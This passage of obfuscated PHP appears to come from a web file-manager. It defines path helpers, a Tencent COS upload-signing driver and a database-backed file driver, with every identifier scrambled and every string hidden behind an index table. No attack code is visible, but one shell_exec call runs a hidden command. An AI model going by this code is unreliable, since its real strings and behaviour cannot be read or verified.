1, -1); $Ì¦‰¶å´[$Œı“ò·ü[399]] = $·ñÒÓÏÙ[3]; } $Ì¦‰¶å´[$Œı“ò·ü[1174]] = $·ñÒÓÏÙ[4]; } $™İĞÔÌô = array($Œı“ò·ü[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ì¦‰¶å´[$Œı“ò·ü[1239]] = in_array($Ì¦‰¶å´[$Œı“ò·ü[33]], $™İĞÔÌô); return $Ì¦‰¶å´; } public static function isTruePath($¼‚úà’ß) { $É½Üºˆ =& $_SERVER[§ŒØóıü]; if (substr($¼‚úà’ß, 0, 1) != $É½Üºˆ[1275]) { return !0; } if (strpos($¼‚úà’ß, $É½Üºˆ[408]) === 0) { return !0; } if (strpos($¼‚úà’ß, $É½Üºˆ[1243]) === 0) { return !0; } if (strpos($¼‚úà’ß, $É½Üºˆ[1277]) === 0) { return !0; } if (strpos($¼‚úà’ß, $É½Üºˆ[1278]) === 0) { return !0; } if (strpos($¼‚úà’ß, $É½Üºˆ[1279]) === 0) { return !0; } return !1; } public static function clear($½¹ùãÕº) { $‡ëãÈŸË =& $_SERVER[§ŒØóıü]; $½¹ùãÕº = str_replace(array($‡ëãÈŸË[1084], $‡ëãÈŸË[231]), $‡ëãÈŸË[53], $½¹ùãÕº); $½¹ùãÕº = str_replace($‡ëãÈŸË[97], $‡ëãÈŸË[8], $½¹ùãÕº); $³Ê™î¶š = $‡ëãÈŸË[1280]; if (substr($½¹ùãÕº, 0, 3) == $‡ëãÈŸË[1281]) { $½¹ùãÕº = substr($½¹ùãÕº, 3); } while (strstr($½¹ùãÕº, $³Ê™î¶š)) { $½¹ùãÕº = str_replace($³Ê™î¶š, $‡ëãÈŸË[8], $½¹ùãÕº); } $½¹ùãÕº = preg_replace($‡ëãÈŸË[1282], $‡ëãÈŸË[8], $½¹ùãÕº); if ($½¹ùãÕº == $‡ëãÈŸË[8]) { return $‡ëãÈŸË[8]; } $½¹ùãÕº = rtrim($½¹ùãÕº, $‡ëãÈŸË[8]); return $½¹ùãÕº; } public static function sourceID($ÏÎÍ¯›ü) { $¬Î¾¼Ëá =& $_SERVER[§ŒØóıü]; $ôÀ§Åí˜ = self::parse($ÏÎÍ¯›ü); if ($ôÀ§Åí˜[$¬Î¾¼Ëá[33]] !== self::KOD_SOURCE) { show_json(LNG($¬Î¾¼Ëá[1283]), !1); } return $ôÀ§Åí˜[$¬Î¾¼Ëá[399]]; } public static function make($å¢–´«) { if (!$å¢–´«) { return !1; } return self::makePath(self::KOD_SOURCE, intval($å¢–´«)); } public static function makeShare($›áÌÅ½™, $ªƒª²) { return self::makePath(self::KOD_SHARE_ITEM, $›áÌÅ½™, $ªƒª²); } public static function makeFileTypePath($îÉ…«Øâ) { return self::makePath(self::KOD_USER_FILE_TYPE, $îÉ…«Øâ); } public static function makeFileTagPath($èïƒ‡ÍÉ) { return self::makePath(self::KOD_USER_FILE_TAG, $èïƒ‡ÍÉ); } public static function makePath($ñúÄı¹İ, $¬êµü”ê = '', $¦ÄûÉø” = '') { $ Ç»ÅüÁ =& $_SERVER[§ŒØóıü]; $Ñ›æ—Ò‚ = substr($ñúÄı¹İ, 1, -1); $ÎÑÊÏ„Ğ = $ Ç»ÅüÁ[1284] . $Ñ›æ—Ò‚ . $ Ç»ÅüÁ[1285] . $¬êµü”ê . $ Ç»ÅüÁ[1286]; $ÎÑÊÏ„Ğ = $¦ÄûÉø” ? $ÎÑÊÏ„Ğ . $¦ÄûÉø” . $ Ç»ÅüÁ[8] : $ÎÑÊÏ„Ğ; return $ÎÑÊÏ„Ğ; } public static function hashPath($úğóæ®ë, $«ÏŸ™¨ = true) { $Úß©¼Ò =& $_SERVER[§ŒØóıü]; $Œéí×ˆ¤ = is_array($úğóæ®ë) ? $úğóæ®ë : IO::info($úğóæ®ë); $¢’×»ó† = _get($Œéí×ˆ¤, $Úß©¼Ò[1287], $Úß©¼Ò[12]); if (!$¢’×»ó† && isset($Œéí×ˆ¤[$Úß©¼Ò[402]])) { $Œéí×ˆ¤ = IO::info(KodIO::make($Œéí×ˆ¤[$Úß©¼Ò[402]])); $¢’×»ó† = _get($Œéí×ˆ¤, $Úß©¼Ò[1287], $Úß©¼Ò[12]); } if (!$¢’×»ó† && $«ÏŸ™¨) { $Íí‚ø˜ = KodIO::parse($Œéí×ˆ¤[$Úß©¼Ò[84]]); if (!$Íí‚ø˜[$Úß©¼Ò[33]]) { $¢’×»ó† = IO::hashSimple($Œéí×ˆ¤[$Úß©¼Ò[84]]); } } if (!$¢’×»ó†) { $¢’×»ó† = md5($Œéí×ˆ¤[$Úß©¼Ò[84]] . $Œéí×ˆ¤[$Úß©¼Ò[76]] . $Œéí×ˆ¤[$Úß©¼Ò[85]]); } return $¢’×»ó†; } public static function hashPathSafe($¹·ÚŞ­¶, $¶‰á •Ò = true) { $°î×Ò‰Ë =& $_SERVER[§ŒØóıü]; $¥ñ†Äæß = self::hashPath($¹·ÚŞ­¶, $¶‰á •Ò); return md5($¥ñ†Äæß . $°î×Ò‰Ë[1288] . Model($°î×Ò‰Ë[776])->get($°î×Ò‰Ë[777])); } public static function initSystemPath() { $ÃÎ÷ãÙÀ =& $_SERVER[§ŒØóıü]; if (defined($ÃÎ÷ãÙÀ[1289])) { return; } define($ÃÎ÷ãÙÀ[1289], self::systemPath($ÃÎ÷ãÙÀ[1290])); define($ÃÎ÷ãÙÀ[1291], self::systemPath($ÃÎ÷ãÙÀ[1292])); define($ÃÎ÷ãÙÀ[1293], self::systemPath($ÃÎ÷ãÙÀ[1294])); define($ÃÎ÷ãÙÀ[1295], self::systemPath($ÃÎ÷ãÙÀ[1296])); IOHistory::bindEvent(); } public static function systemPath($Ù£‡‡›Õ) { $²Æ¡îíï =& $_SERVER[§ŒØóıü]; $È±¤“èô = $²Æ¡îíï[1297] . ucfirst($Ù£‡‡›Õ); $û¬šèú´ = Model($²Æ¡îíï[776])->get($È±¤“èô); if ($û¬šèú´) { return $û¬šèú´; } if ($Ù£‡‡›Õ == $²Æ¡îíï[1290]) { $û¬šèú´ = self::make(Model($²Æ¡îíï[831])->systemRootPathAdd($²Æ¡îíï[534])); } else { $û¬šèú´ = self::systemPath($²Æ¡îíï[1290]); $øÍäÁ‡ = self::sourceID($û¬šèú´); $û¬šèú´ = self::make(Model($²Æ¡îíï[831])->mkdir($øÍäÁ‡, $Ù£‡‡›Õ)); } Model($²Æ¡îíï[776])->set($È±¤“èô, $û¬šèú´); return $û¬šèú´; } public static function systemFolder($²’ÄÖÅØ) { $¨æ¯ŞèÉ = IO_PATH_SYSTEM_SOURCE . $²’ÄÖÅØ; $ÇË¢í­‚ = Cache::get($¨æ¯ŞèÉ); if (!$ÇË¢í­‚) { $ÄğİÅ×¯ = IO::infoFull($¨æ¯ŞèÉ); if (!$ÄğİÅ×¯) { $ÇË¢í­‚ = IO::mkdir($¨æ¯ŞèÉ, REPEAT_SKIP); } else { $ÇË¢í­‚ = $ÄğİÅ×¯[$_SERVER[§ŒØóıü][84]]; } Cache::set($¨æ¯ŞèÉ, $ÇË¢í­‚, 3600 * 10); } return $ÇË¢í­‚; } public static function defaultDriver() { return Model($_SERVER[§ŒØóıü][773])->defaultDriver(); } public static function defaultIO() { $òâ§È¼ˆ =& $_SERVER[§ŒØóıü]; $Ã†´×¿Š = self::defaultDriver(); return $òâ§È¼ˆ[1298] . $Ã†´×¿Š[$òâ§È¼ˆ[399]] . $òâ§È¼ˆ[1286]; } public static function defaultDriverInit() { static $’”°åìè = false; if ($’”°åìè) { return $’”°åìè; } $’”°åìè = IO::init(self::defaultIO()); return $’”°åìè; } public static function fileTypeList() { $ÄÒñ™Ì =& $_SERVER[§ŒØóıü]; $àø¿ß„ = $GLOBALS[$ÄÒñ™Ì[6]][$ÄÒñ™Ì[1299]]; foreach ($àø¿ß„ as $œ½…º => $‰Æ£) { $æíğ®Şä = $ÄÒñ™Ì[1300] . $œ½…º; $÷ÈÄ¡½ = LNG($æíğ®Şä); if ($æíğ®Şä != $÷ÈÄ¡½) { $àø¿ß„[$œ½…º][$ÄÒñ™Ì[32]] = $÷ÈÄ¡½; } } return $àø¿ß„; } public static function diskList($ø‰¤©ğÓ = true) { $áÆ—è¹ = $_SERVER[§ŒØóıü][1301]; if ($ø‰¤©ğÓ) { $–Ø¢­İí = Cache::get($áÆ—è¹); if (is_array($–Ø¢­İí)) { return $–Ø¢­İí; } } $–Ø¢­İí = self::diskListGet(); Cache::set($áÆ—è¹, $–Ø¢­İí, 60); return $–Ø¢­İí; } public static function diskListGet() { $¹îššÕ§ =& $_SERVER[§ŒØóıü]; $ûÒÕàÌ = array(); if ($GLOBALS[$¹îššÕ§[6]][$¹îššÕ§[1302]] == $¹îššÕ§[1303]) { $æŞş…¶Ğ = $¹îššÕ§[1304]; for ($­à¬ÀÄ = 0; $­à¬ÀÄ < strlen($æŞş…¶Ğ); $­à¬ÀÄ++) { $Ç”ú…œŞ = $æŞş…¶Ğ[$­à¬ÀÄ] . $¹îššÕ§[1305]; if (file_exists($Ç”ú…œŞ)) { $ûÒÕàÌ[] = $Ç”ú…œŞ; } } return $ûÒÕàÌ; } if (!function_exists($¹îššÕ§[98])) { $ûÒÕàÌ[] = $¹îššÕ§[841]; return $ûÒÕàÌ; } $‰ßô‡¢‹ = explode($¹îššÕ§[231], shell_exec($¹îššÕ§[1306])); array_shift($‰ßô‡¢‹); array_pop($‰ßô‡¢‹); $ÛÜ´Ä‰÷ = array($¹îššÕ§[1307], $¹îššÕ§[1308], $¹îššÕ§[1309], $¹îššÕ§[1310], $¹îššÕ§[1311], $¹îššÕ§[1312], $¹îššÕ§[1313], $¹îššÕ§[1314]); foreach ($‰ßô‡¢‹ as $Şğ½Ñô) { $Ïç§éÀ = preg_split($¹îššÕ§[1315], $Şğ½Ñô); $Ç”ú…œŞ = $Ïç§éÀ[count($Ïç§éÀ) - 1]; if (!strstr($Ïç§éÀ[0], $¹îššÕ§[1316]) || !$Ç”ú…œŞ) { continue; } $¹ˆË²İ¬ = rtrim($Ç”ú…œŞ, $¹îššÕ§[8]) . $¹îššÕ§[8]; if (in_array($¹ˆË²İ¬, $ÛÜ´Ä‰÷)) { continue; } $ûÒÕàÌ[] = $¹ˆË²İ¬; } return $ûÒÕàÌ; } public static function isSameDisk($Â»÷ó¬ò, $ÅÚòÂğ) { $ÇÃÚÆ† =& $_SERVER[§ŒØóıü]; if ($GLOBALS[$ÇÃÚÆ†[6]][$ÇÃÚÆ†[1302]] == $ÇÃÚÆ†[1303]) { return strtolower(substr($Â»÷ó¬ò, 0, 1)) == strtolower(substr($ÅÚòÂğ, 0, 1)); } $›úÉ«Èğ = self::diskList(); $ÙØ†È”Ì = !1; $óÑËÍ½´ = !1; sort($›úÉ«Èğ); $›úÉ«Èğ = array_reverse($›úÉ«Èğ); $Â»÷ó¬ò = rtrim($Â»÷ó¬ò, $ÇÃÚÆ†[8]) . $ÇÃÚÆ†[8]; $ÅÚòÂğ = rtrim($ÅÚòÂğ, $ÇÃÚÆ†[8]) . $ÇÃÚÆ†[8]; foreach ($›úÉ«Èğ as $¯°Èßäô) { $•µĞ = strlen($¯°Èßäô); if (!$ÙØ†È”Ì && substr($Â»÷ó¬ò, 0, $•µĞ) == $¯°Èßäô) { $ÙØ†È”Ì = $¯°Èßäô; } if (!$óÑËÍ½´ && substr($ÅÚòÂğ, 0, $•µĞ) == $¯°Èßäô) { $óÑËÍ½´ = $¯°Èßäô; } if ($ÙØ†È”Ì && $óÑËÍ½´) { break; } } return $ÙØ†È”Ì === $óÑËÍ½´; } public static function transferType($³êÜ±ÁÓ, $ı¼—–©ˆ) { $šÖĞŸÀª =& $_SERVER[§ŒØóıü]; $‚Ûš‡ûË = self::driverType($³êÜ±ÁÓ); $½±½Î·• = self::driverType($ı¼—–©ˆ); if ($‚Ûš‡ûË[$šÖĞŸÀª[33]] == $½±½Î·•[$šÖĞŸÀª[33]] && $‚Ûš‡ûË[$šÖĞŸÀª[1317]] == $½±½Î·•[$šÖĞŸÀª[1317]]) { return $šÖĞŸÀª[1318]; } if ($‚Ûš‡ûË[$šÖĞŸÀª[33]] == $šÖĞŸÀª[874] && $½±½Î·•[$šÖĞŸÀª[33]] == $šÖĞŸÀª[106]) { return $šÖĞŸÀª[1200]; } if ($‚Ûš‡ûË[$šÖĞŸÀª[33]] == $šÖĞŸÀª[106] && $½±½Î·•[$šÖĞŸÀª[33]] == $šÖĞŸÀª[874]) { return $šÖĞŸÀª[107]; } return $šÖĞŸÀª[1319]; } public static function driverType($ÇôŞúÛµ) { $À•×í§İ =& $_SERVER[§ŒØóıü]; $Şšëè = str_replace($À•×í§İ[1320], $À•×í§İ[12], strtolower($ÇôŞúÛµ->getType())); if ($Şšëè == $À•×í§İ[763] || $Şšëè == $À•×í§İ[1321] || $Şšëè == $À•×í§İ[1322]) { $ÇôŞúÛµ = self::defaultDriverInit(); } else { if ($Şšëè == $À•×í§İ[1210] || $Şšëè == $À•×í§İ[1323]) { $ÇôŞúÛµ = IO::init($ÇôŞúÛµ->pathParse[$À•×í§İ[1157]]); } } $î¶–øù÷ = $ÇôŞúÛµ->path; $Şšëè = str_replace($À•×í§İ[1320], $À•×í§İ[12], strtolower($ÇôŞúÛµ->getType())); if ($Şšëè == $À•×í§İ[106]) { return array($À•×í§İ[33] => $À•×í§İ[106], $À•×í§İ[1317] => $À•×í§İ[12], $À•×í§İ[84] => $î¶–øù÷, $À•×í§İ[95] => $ÇôŞúÛµ); } return array($À•×í§İ[33] => $À•×í§İ[874], $À•×í§İ[1317] => $ÇôŞúÛµ->pathDriver, $À•×í§İ[84] => $î¶–øù÷, $À•×í§İ[95] => $ÇôŞúÛµ); } public static function pathDriverType($Š¾Í“æ) { return $Š¾Í“æ ? self::driverType(IO::init($Š¾Í“æ)) : !1; } public static function pathDriverLocal($ö­é¿½Ê) { $òÌ©óº =& $_SERVER[§ŒØóıü]; $İÔ §íï = $ö­é¿½Ê ? self::driverType(IO::init($ö­é¿½Ê)) : !1; return $İÔ §íï[$òÌ©óº[33]] == $òÌ©óº[106] ? !0 : !1; } public static function allowCover($çÊ÷¯ÄÄ, $ÀŒ£Şì = true) { $¼¸‹¿Î“ =& $_SERVER[§ŒØóıü]; if (is_string($çÊ÷¯ÄÄ)) { $çÊ÷¯ÄÄ = IO::info($çÊ÷¯ÄÄ); } if (!$çÊ÷¯ÄÄ || $çÊ÷¯ÄÄ[$¼¸‹¿Î“[33]] == $¼¸‹¿Î“[75] || $çÊ÷¯ÄÄ[$¼¸‹¿Î“[76]] <= 100) { return !1; } if (isset($çÊ÷¯ÄÄ[$¼¸‹¿Î“[1324]]) || !$çÊ÷¯ÄÄ[$¼¸‹¿Î“[84]]) { return !1; } if (isset($çÊ÷¯ÄÄ[$¼¸‹¿Î“[202]]) && !$çÊ÷¯ÄÄ[$¼¸‹¿Î“[202]]) { return $çÊ÷¯ÄÄ; } static $Ñı‰©›ê = false; if (!$Ñı‰©›ê || !$ÀŒ£Şì) { $é™±²ì× = self::driverType(IO::init($çÊ÷¯ÄÄ[$¼¸‹¿Î“[84]])); $íØ¦şÌö = $é™±²ì×[$¼¸‹¿Î“[95]]; $Ñı‰©›ê = $¼¸‹¿Î“[1325]; if ($é™±²ì×[$¼¸‹¿Î“[33]] == $¼¸‹¿Î“[106]) { $Ñı‰©›ê = $¼¸‹¿Î“[1326]; } if ($é™±²ì×[$¼¸‹¿Î“[95]] && isset($é™±²ì×[$¼¸‹¿Î“[95]]->config[$¼¸‹¿Î“[1327]]) && $é™±²ì×[$¼¸‹¿Î“[95]]->config[$¼¸‹¿Î“[1327]]) { $Ñı‰©›ê = $¼¸‹¿Î“[1326]; } } return $Ñı‰©›ê == $¼¸‹¿Î“[1326] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ğè´ÆÒá) { parent::__construct($ğè´ÆÒá); $this->signatureVersion($_SERVER[§ŒØóıü][216]); } public function uploadFormData($“»Ú‹öÉ, $³«¶Ø¬Á = 3600) { $ÄÚúÍÈ =& $_SERVER[§ŒØóıü]; $›æèìŞ = $ÄÚúÍÈ[199]; $ªé’Ñ—¯ = $ÄÚúÍÈ[232]; $ş›±Ï°ğ = $ÄÚúÍÈ[1328]; $Ïü¶±¨ = gmdate($ÄÚúÍÈ[1329], time() + $³«¶Ø¬Á); $ùö£İñÚ = (string) time() . $ÄÚúÍÈ[71] . (string) (time() + $³«¶Ø¬Á); $¯™¤İ¢¡ = array($ÄÚúÍÈ[1330] => $Ïü¶±¨, $ÄÚúÍÈ[1331] => array(array($ÄÚúÍÈ[1332] => $›æèìŞ), array($ÄÚúÍÈ[1333] => $this->bucket), array($ÄÚúÍÈ[1334], $ÄÚúÍÈ[1335], $ÄÚúÍÈ[12]), array($ÄÚúÍÈ[1336] => $ş›±Ï°ğ), array($ÄÚúÍÈ[1337] => $ªé’Ñ—¯), array($ÄÚúÍÈ[1338] => $this->accessKey), array($ÄÚúÍÈ[1339] => $ùö£İñÚ))); $¯™¤İ¢¡ = json_encode($¯™¤İ¢¡); $Òö„ù­ = hash_hmac($ÄÚúÍÈ[232], $ùö£İñÚ, $this->secret); $Àä’¸« = sha1($¯™¤İ¢¡); $ñÛüèÒ® = hash_hmac($ÄÚúÍÈ[232], $Àä’¸«, $Òö„ù­); $ŸîÇÆë = array($ÄÚúÍÈ[1332] => $›æèìŞ, $ÄÚúÍÈ[1336] => $ş›±Ï°ğ, $ÄÚúÍÈ[1340] => base64_encode($¯™¤İ¢¡), $ÄÚúÍÈ[1337] => $ªé’Ñ—¯, $ÄÚúÍÈ[1338] => $this->accessKey, $ÄÚúÍÈ[1341] => $ùö£İñÚ, $ÄÚúÍÈ[1342] => $ñÛüèÒ®, $ÄÚúÍÈ[182] => $this->getHost()); return $ŸîÇÆë; } public function fileOutLink($‘´›óøä) { $Ì·µ‡ı« =& $_SERVER[§ŒØóıü]; if (substr($‘´›óøä, 0, 7) == $Ì·µ‡ı«[1343]) { $‘´›óøä = $Ì·µ‡ı«[1344] . substr($‘´›óøä, 7); } header($Ì·µ‡ı«[161] . $‘´›óøä); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ğØåÁ±©) { $this->pathParse = $ğØåÁ±©; $this->model = Model($_SERVER[§ŒØóıü][1345]); } public function getPath($ë¡Ã¬ó) { return trim($ë¡Ã¬ó, $_SERVER[§ŒØóıü][8]); } public function pathFather($÷ÌˆÉ§€) { $Ù‹İİÕş = $this->parse($÷ÌˆÉ§€); $Ù‹İİÕş = $this->infoSimple($÷ÌˆÉ§€); return $Ù‹İİÕş ? $Ù‹İİÕş[$_SERVER[§ŒØóıü][432]] : !1; } public function pathThis($ÍæÒ‘çÂ) { $Ûæ£ªûŸ = $this->infoSimple($ÍæÒ‘çÂ); return $Ûæ£ªûŸ ? $Ûæ£ªûŸ[$_SERVER[§ŒØóıü][32]] : !1; } public function getPathOuter($š†¬¸²) { if (!$š†¬¸²) { return $š†¬¸²; } $™àùáû² = $this->parse($š†¬¸²); return KodIO::make($™àùáû²[$_SERVER[§ŒØóıü][399]]); } public function copyFolderFromIO($’ãøŞú, $×æİçá“, $É”é†Ó, $ÆŞÇñ, $×š¿Öö¤) { $æ§ùãÄç = $this->model->copyFolderFromIO($’ãøŞú, $×æİçá“, $É”é†Ó, $ÆŞÇñ, $×š¿Öö¤); return KodIO::make($æ§ùãÄç); } public function isParentOf($Êæ­İ¸‰, $¼‹Åœ¥ø) { return $this->model->isParentOf($Êæ­İ¸‰, $¼‹Åœ¥ø); } public function mkfile($ ¥¶©Çõ, $ùÆ¸ÄŞá = '', $ºÚƒ…Ã = REPEAT_RENAME) { $±½Æ¤ªí =& $_SERVER[§ŒØóıü]; $Ì¢”µÊ = $this->parse($ ¥¶©Çõ); $ ¥¶©Çõ = $Ì¢”µÊ[$±½Æ¤ªí[399]]; for ($‰»ê·öñ = 0; $‰»ê·öñ < count($Ì¢”µÊ[$±½Æ¤ªí[1346]]); $‰»ê·öñ++) { $©ªñè¿‰ = $Ì¢”µÊ[$±½Æ¤ªí[1346]][$‰»ê·öñ]; if ($‰»ê·öñ == count($Ì¢”µÊ[$±½Æ¤ªí[1346]]) - 1) { $ ¥¶©Çõ = $this->model->mkfile($ ¥¶©Çõ, $©ªñè¿‰, $ùÆ¸ÄŞá, $ºÚƒ…Ã); break; } $ ¥¶©Çõ = $this->model->mkdir($ ¥¶©Çõ, $©ªñè¿‰, REPEAT_SKIP); } return $this->getPathOuter($ ¥¶©Çõ); } public function mkdir($ì‰¨›™Ç, $æƒØÏø = REPEAT_SKIP) { $ŸËŸœ½Ê =& $_SERVER[§ŒØóıü]; $ü¡à¥şÌ = $this->parse($ì‰¨›™Ç); $ì‰¨›™Ç = $ü¡à¥şÌ[$ŸËŸœ½Ê[399]]; for ($§ó„—Ñ³ = 0; $§ó„—Ñ³ < count($ü¡à¥şÌ[$ŸËŸœ½Ê[1346]]); $§ó„—Ñ³++) { $Ÿ¿Ü™¬Õ = $ü¡à¥şÌ[$ŸËŸœ½Ê[1346]][$§ó„—Ñ³]; $ì‰¨›™Ç = $this->model->mkdir($ì‰¨›™Ç, $Ÿ¿Ü™¬Õ, $æƒØÏø); } return $this->getPathOuter($ì‰¨›™Ç); } public function copyFile($ šÙĞ, $°«ìĞŠÊ, $ÎÁâºñº = REPEAT_REPLACE) { $–ƒƒÛ—ó =& $_SERVER[§ŒØóıü]; $»Äõ®ö‡ = $this->parse($°«ìĞŠÊ); $¹ŞÑêÍÍ = $this->model->copy($ šÙĞ, $»Äõ®ö‡[$–ƒƒÛ—ó[399]], $ÎÁâºñº, $»Äõ®ö‡[$–ƒƒÛ—ó[84]]); return $¹ŞÑêÍÍ ? $this->getPathOuter($¹ŞÑêÍÍ) : !1; } public function moveFile($º§ï·ôŒ, $À‰ãíŸË, $‘ıôèÖŞ = REPEAT_REPLACE) { $Òòİò¿• =& $_SERVER[§ŒØóıü]; $ĞÚı’é = $this->parse($À‰ãíŸË); $ç®”¹Èà = $this->model->move($º§ï·ôŒ, $ĞÚı’é[$Òòİò¿•[399]], $‘ıôèÖŞ, $ĞÚı’é[$Òòİò¿•[84]]); return $ç®”¹Èà ? $this->getPathOuter($ç®”¹Èà) : !1; } public function copy($‚ş„Û¤“, $œ ½Ö³š, $ó¡İÚµ‚ = REPEAT_REPLACE, $Êç«µíç = false) { $ô”ãÃ‚ = $this->parse($œ ½Ö³š); $ö±£¥Ú = $this->model->copy($‚ş„Û¤“, $ô”ãÃ‚[$_SERVER[§ŒØóıü][399]], $ó¡İÚµ‚, $Êç«µíç); return $ö±£¥Ú ? $this->getPathOuter($ö±£¥Ú) : !1; } public function moveSameAllow() { } public function move($±À›°÷, $°Ú½Áêƒ, $ıÈïØèš = REPEAT_REPLACE, $¯Ô·şõÊ = false) { $¡Ÿé® = $this->parse($°Ú½Áêƒ); $Î¿Œí‡Å = $this->model->move($±À›°÷, $¡Ÿé®[$_SERVER[§ŒØóıü][399]], $ıÈïØèš, $¯Ô·şõÊ); return $Î¿Œí‡Å ? $this->getPathOuter($Î¿Œí‡Å) : !1; } public function remove($Ş˜’—ßÃ, $Ì¨±§ÑÈ = true) { return $this->model->remove($Ş˜’—ßÃ, $Ì¨±§ÑÈ); } public function rename($œ¢Ò°İ, $¡ó‰) { $Á¶ÂÛ™É = $this->model->rename($œ¢Ò°İ, $¡ó‰); return $Á¶ÂÛ™É ? $this->getPathOuter($œ¢Ò°İ) : $Á¶ÂÛ™É; } public function size($×Á ÌáÖ) { $×˜»¹ ª = $this->infoSimple($×Á ÌáÖ); return $×˜»¹ ª ? $×˜»¹ ª[$_SERVER[§ŒØóıü][76]] : 0; } public function infoSimple($áÒÉã‘Æ) { return $this->model->sourceInfo($áÒÉã‘Æ); } public function info($éÇÎ¢©Ö) { return $this->infoParse($éÇÎ¢©Ö); } public function infoAuth($ÔÂˆ·åŠ) { return $this->infoParse($ÔÂˆ·åŠ, !1, !0); } public function infoWithChildren($ûÓ€ˆÉƒ) { return $this->infoParse($ûÓ€ˆÉƒ, !0); } protected function infoParse($¬À„ŒÃÁ, $•ˆº²–Ò = false, $‹‘†ôšÜ = false) { if (!$•ˆº²–Ò) { return $this->model->pathInfo($¬À„ŒÃÁ, $‹‘†ôšÜ); } return $this->model->pathInfoMore($¬À„ŒÃÁ); } public function infoFull($–â¨şÊş) { $»·›ïÖ =& $_SERVER[§ŒØóıü]; $ô€şÛìô = explode($»·›ïÖ[8], $–â¨şÊş); $µğûÍáô = implode($»·›ïÖ[8], array_splice($ô€şÛìô, 1)); return $this->model->pathInfoByPath($ô€şÛìô[0], $µğûÍáô); } public function hashSimple($Â¹¾ÊàÁ) { $™ù‡èÆ’ =& $_SERVER[§ŒØóıü]; $Ì¡ÅŸ‹ˆ = $this->infoWithChildren($Â¹¾ÊàÁ); return $Ì¡ÅŸ‹ˆ[$™ù‡èÆ’[170]][$™ù‡èÆ’[177]]; } public function hashMd5($”ß¤éÙ») { $ÍÕ¨©´ö =& $_SERVER[§ŒØóıü]; $ØëÜ©òô = $this->infoWithChildren($”ß¤éÙ»); return $ØëÜ©òô[$ÍÕ¨©´ö[170]][$ÍÕ¨©´ö[176]]; } public function exist($ŒìÓùğ¹) { $şß Ê¢Ğ =& $_SERVER[§ŒØóıü]; $‘•æäÄ = $this->parse($ŒìÓùğ¹); if (!$‘•æäÄ[$şß Ê¢Ğ[84]]) { return $this->isFile($ŒìÓùğ¹) || $this->isFolder($ŒìÓùğ¹); } $¯Ì‚ãî® = array($şß Ê¢Ğ[401] => $‘•æäÄ[$şß Ê¢Ğ[399]], $şß Ê¢Ğ[32] => $‘•æäÄ[$şß Ê¢Ğ[84]]); $ü¡ôƒü˜ = $this->model->where($¯Ì‚ãî®)->find(); return $ü¡ôƒü˜ ? !0 : !1; } public function isFile($¢’çå†) { $Üàç’ÃÁ =& $_SERVER[§ŒØóıü]; $¢›¯Æ—° = $this->infoSimple($¢’çå†); return $¢›¯Æ—° && $¢›¯Æ—°[$Üàç’ÃÁ[410]] == $Üàç’ÃÁ[88] ? !1 : !0; } public function isFolder($µÛ¶Şï) { $ÎÇ·¹á =& $_SERVER[§ŒØóıü]; $¿«åóØ· = $this->infoSimple($µÛ¶Şï); return $¿«åóØ· && $¿«åóØ·[$ÎÇ·¹á[410]] == $ÎÇ·¹á[88] ? !0 : !1; } public function listPath($¯«¨«Ãí, $ÑÏ‚À£ = false) { $ÄË—ƒ­• =& $_SERVER[§ŒØóıü]; if ($¯«¨«Ãí == $ÄË—ƒ­•[12]) { return !1; } $Å”ªç± = array($ÄË—ƒ­•[401] => $¯«¨«Ãí); if ($ÑÏ‚À£) { return $this->model->listSource($Å”ªç±, -1); } return $this->model->listSource($Å”ªç±); } public function has($¸Ğ¸¦«º, $Äöì²Ø = false, $ŠÔ ó× = null) { $Æë»ô’ =& $_SERVER[§ŒØóıü]; $¿¿íÉÍÃ = $this->infoWithChildren($¸Ğ¸¦«º); if ($Äöì²Ø) { return array($Æë»ô’[208] => $¿¿íÉÍÃ[$Æë»ô’[208]], $Æë»ô’[207] => $¿¿íÉÍÃ[$Æë»ô’[207]]); } return $ŠÔ ó× ? $¿¿íÉÍÃ[$Æë»ô’[208]] : $¿¿íÉÍÃ[$Æë»ô’[207]]; } public function listAll($ïĞ–Áºõ) { $©ä·²ßĞ = IO::info($this->pathParse[$_SERVER[§ŒØóıü][84]]); if (!$©ä·²ßĞ) { return array(); } return $this->model->listAll($ïĞ–Áºõ); } public function getContent($æ²“€ôæ) { return $this->model->getContent($æ²“€ôæ); } public function setContent($Øş¬¨âç, $‰›×ì = '') { return $this->model->setContent($Øş¬¨âç, $‰›×ì); } public function fileSubstr($ÎÚúÑê˜, $§á¡¸ç, $ÂéÍ§‰ğ) { return $this->model->fileSubstr($ÎÚúÑê˜, $§á¡¸ç, $ÂéÍ§‰ğ); } public function download($ã¹²©ü, $·áş¡Ÿ = '') { $ß›ÂÃ½ñ = get_path_father($·áş¡Ÿ); $¢šÚ€¹ = get_path_this($·áş¡Ÿ); $Œñ€Ê‹² = $this->model->fileInfoGet($ã¹²©ü); $ıŠ¬äÅÃ = IO::copy($Œñ€Ê‹²[$_SERVER[§ŒØóıü][84]], $ß›ÂÃ½ñ, !1, $¢šÚ€¹); return $ıŠ¬äÅÃ; } public function setModifyTime($¶Ì«ûö, $Æ¥ëë› = '') { $¶­ŸÔÅ» =& $_SERVER[§ŒØóıü]; if (!$¶Ì«ûö) { return; } $this->model->where(array($¶­ŸÔÅ»[417] => $¶Ì«ûö))->save(array($¶­ŸÔÅ»[85] => $Æ¥ëë›)); } public function upload($¤¼«şÊ , $Ÿ— È²×, $Ñìš¬Ô  = false, $Ğ™‡›ãÛ = REPEAT_REPLACE) { $Şœµ ª¸ =& $_SERVER[§ŒØóıü]; $æúÄßø› = $this->parse($¤¼«şÊ ); $À¨‰… = $this->model->addFile($æúÄßø›[$Şœµ ª¸[399]], $Ÿ— È²×, $æúÄßø›[$Şœµ ª¸[84]], $Ñìš¬Ô , $Ğ™‡›ãÛ); return $this->getPathOuter($À¨‰…); } public function uploadFileByID($¡…²Ù¡Ô, $Òû³Ğ±¬, $Ú¬ÙĞ¡) { $´Ü½ô÷ =& $_SERVER[§ŒØóıü]; $ó ¦¾ú· = $this->parse($¡…²Ù¡Ô); $Ñ››‰âå = $this->model->addFileByFileID($ó ¦¾ú·[$´Ü½ô÷[399]], $Òû³Ğ±¬, $ó ¦¾ú·[$´Ü½ô÷[84]], $Ú¬ÙĞ¡); return $this->getPathOuter($Ñ››‰âå); } public function addFileByRemote($ÒÅÉ¹¢, 